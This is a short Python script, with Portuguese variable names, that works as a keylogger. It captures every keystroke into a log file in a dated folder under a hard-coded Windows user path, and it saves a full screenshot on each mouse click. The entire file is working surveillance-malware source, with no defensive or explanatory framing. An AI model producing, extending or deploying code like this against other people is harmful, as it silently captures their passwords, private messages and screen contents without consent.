from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeybordListener
from datetime import datetime
import re, os, pyautogui as py

dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")
diretorioRaiz = "C:/Users/joaon/Desktop/PyKeyLogger/" + data + "/"
arquivoLog = diretorioRaiz + "keylogger.log"

try:
    os.mkdir(diretorioRaiz)
except:
    pass

def on_click(x, y, buttom, pressed):
    if pressed:
        # print(f"Mouse clicou em {x}, {y} com {buttom}")
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H-%M-%S")
        nomeArquivo = "keylogger_" + horarioPrint + "_.png"
        minhaPrint.save(os.path.join(diretorioRaiz, nomeArquivo))

def on_press(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.tab', '\t', tecla)
    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    with open(arquivoLog, 'a') as log:
        if str(tecla) == str("apagar"):
            if os.stat(arquivoLog).st_size != 0:
                tecla = re.sub(r'Key.backspace', '', tecla)
                log.seek(0,2)
                caractere = log.tell()
                log.truncate(caractere - 1)
        else:
            log.write(tecla)

keybordListener = KeybordListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

keybordListener.start()
mouseListener.start()
keybordListener.join()
mouseListener.join()